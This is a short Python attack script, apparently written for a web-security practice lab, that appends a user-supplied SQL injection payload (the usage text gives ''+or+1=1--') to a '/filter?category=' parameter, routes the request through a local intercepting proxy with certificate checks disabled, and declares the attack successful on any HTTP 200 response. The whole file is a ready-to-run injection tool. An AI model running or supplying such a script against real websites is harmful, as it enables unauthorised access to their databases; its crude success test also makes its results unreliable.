import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def union_sqli(url, payload):
    uri = '/filter?category=Pets'+payload
    response = requests.get(url+uri, proxies=proxies, verify=False)
    if response.status_code == 200:
        return True
    else:
        return False

if __name__=='__main__':
    try:
        url = sys.argv[1]
        payload = sys.argv[2]
    except IndexError:
        print("(+) Usage: %s <url> <payload>" %sys.argv[0])
        print("(+) Example : %s example.com '+or+1=1--" %sys.argv[0])
        sys.exit(-1)
    if union_sqli(url, payload):
        print("(+) SQL Injection Attack Successful")
    else:
        print("(-) SQL Injection Attack Failed")